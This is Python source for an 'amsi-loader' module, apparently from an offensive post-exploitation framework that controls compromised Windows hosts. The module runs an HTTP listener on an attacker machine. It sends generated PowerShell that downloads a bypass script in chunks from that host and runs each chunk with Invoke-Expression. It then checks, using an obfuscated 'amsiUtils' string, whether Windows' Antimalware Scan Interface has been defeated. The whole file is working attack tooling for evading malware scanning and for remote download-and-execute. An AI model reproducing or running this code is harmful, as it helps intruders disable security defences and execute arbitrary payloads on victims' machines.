import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
from termcolor import colored, cprint
from printib import print_ok, print_info, print_error
from urllib.parse import parse_qs, unquote
from module import Module

SCRIPT_BLOCKS = []
LAST_INDEX = 0
FILE_SENDED = False
FILE_SENDED_ERROR = False

class SendFile(BaseHTTPRequestHandler): 
    # To avoid logs in our screen
    def log_message(self, format, *args):
        return
        
    def _set_response(self): 
        self.send_response(200) 
        self.send_header('Content-type', 'text/html') 
        self.end_headers() 

    def do_GET(self): 
        global SCRIPT_BLOCKS, LAST_INDEX
        command = ''
        if LAST_INDEX < len(SCRIPT_BLOCKS):
            command = SCRIPT_BLOCKS[LAST_INDEX]
            
        response = command.encode('utf-8')
        print_info(response)
        
        self._set_response()
        self.wfile.write(response) # response is encoded

    def do_POST(self):
        global FILE_SENDED, FILE_SENDED_ERROR, LAST_INDEX

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        self._set_response()

        self.wfile.write(''.encode('utf-8'))

        try:
            post_data = post_data.decode()
            fields = parse_qs(post_data)
            results = fields['results'][0]

            recv = str(unquote(results))

            if recv == 'Received':
                if LAST_INDEX >= len(SCRIPT_BLOCKS):
                    FILE_SENDED = True
                else:
                    LAST_INDEX += 1
            elif recv == 'Error':
                FILE_SENDED_ERROR = True

        except:
            print_error("Error reading results at file upload.")
            FILE_SENDED_ERROR = True

    def do_HEAD(self): 
        self._set_response() 

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "amsi-loader",
                       "Description": "AMSI bypass script loader",
                       "Author": "@pilarclares"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "ip": ["192.168.56.5", "Local IP (Where the file is located)", True],
                   "port": ["8082", "Listener port", True],
                   "destination": [None, "Directory with the files", True],
                   "filePath": ["/home/kali/rm.ps1", "Path to the bypass file", True],
                   "metadataPath": ["/home/kali/linesnumber.txt", "Path to the file containing line numbers for blocks", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        global FILE_SENDED, FILE_SENDED_ERROR, SCRIPT_BLOCKS, LAST_INDEX

        function = """
        function chargeFiles {
    param (
        [Parameter(Mandatory)]
        [string] $sourceUri,
        [Parameter(Mandatory)]
        [string] $destination
    )
    
    try
    {
        $req = iwr -UseBasicParsing -uri $sourceUri -Method GET
	    Set-Content -Path $destination -Value $req.Content -Encoding utf8

        $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Received'}
    }
    catch
    {
        $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Error'}
        Write-Host "Error executing commands from the file $filePath."
        throw $_.Exception
    }
}

        function loader {
            param (
                [string]$directory,
                [string[]]$files
            )

            if (-not $directory -and -not $files) {
                return "At least one of the parameters `$directory or `$files must be provided."
            }

            if ($directory) {
                if (-Not (Test-Path $directory)) {
                    return "The directory $directory does not exist."
                }

                $files = Get-ChildItem -Path $directory -Recurse -File | Select-Object -ExpandProperty FullName
            }

            foreach ($filePath in $files) {
                if (-Not (Test-Path $filePath)) {
                    return "The file $filePath does not exist."
                }

                try{
                    $content = Get-Content -Path $filePath -Raw
                    Invoke-Expression $content -ErrorAction Stop | Out-Null
                } catch {
                    Write-Host "Error executing commands from the file $filePath."
                    throw $_.Exception
                }
            }

            try {
                $command = 'am' + 's' + 'I' + 'u' + 'TI' + 'l' + 's'

                Invoke-Expression $command -ErrorAction Stop | Out-Null

                return "Success: AMSI bypassed successfully."

            } catch {
                if ($_.Exception.Message -like '*malintencionados*' -or $_.Exception.Message -like '*malicious*') {
                    return "Error: AMSI is still active."
                } else {
                    return "Success: AMSI bypassed successfully."
                }
            }
        }
        """
        file = open(self.args["filePath"], 'r')
        lines = file.readlines()
        firstLine = 0

        sourceUri = "http://{}:{}/".format(self.args["ip"], self.args["port"])

        destination = self.args["destination"]

        index = 0
        function += f"$directoryPath = '{destination}'"
        function += """
        if (Test-Path -Path $directoryPath) {
            Remove-Item -Path $directoryPath -Recurse -Force
        }

        New-Item -Path $directoryPath -ItemType Directory | Out-Null
        """

        with open(self.args["metadataPath"], 'r') as metadata:
            for lineNumber in metadata:
                lineNumber = lineNumber.strip()
                lineNumber = int(lineNumber)
                if len(lines) < lineNumber:
                    print_error(f"The file {self.args['filePath']} does not have {lineNumber} lines.")
                    return
                
                command = ''.join(lines[firstLine:lineNumber])
                firstLine = lineNumber
                SCRIPT_BLOCKS.append(command)
                function += f'chargeFiles -sourceUri { sourceUri } -destination {destination}\\part{index} \n'
                index += 1
                
            function += f'loader -directory { destination }'

            listener = Thread(target=self.run, name='amsi-loader listener', kwargs={'address':self.args["ip"], 'port':int(self.args["port"])})
            print_info("Sending file... waiting answer from warrior")
            listener.start()
            
            super(CustomModule, self).run(function)

            while not FILE_SENDED and not FILE_SENDED_ERROR:
                pass

            if FILE_SENDED_ERROR:
                print_error('An error ocurried sending the script.')

            FILE_SENDED = False
            FILE_SENDED_ERROR = False
            SCRIPT_BLOCKS = []
            LAST_INDEX = 0


    def run(self, server_class=HTTPServer, handler_class=SendFile, address=None, port=9999):
        try: 
            server_address = (address, port)
            httpd = server_class(server_address, handler_class)
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                pass
            httpd.server_close()
        except:
            pass
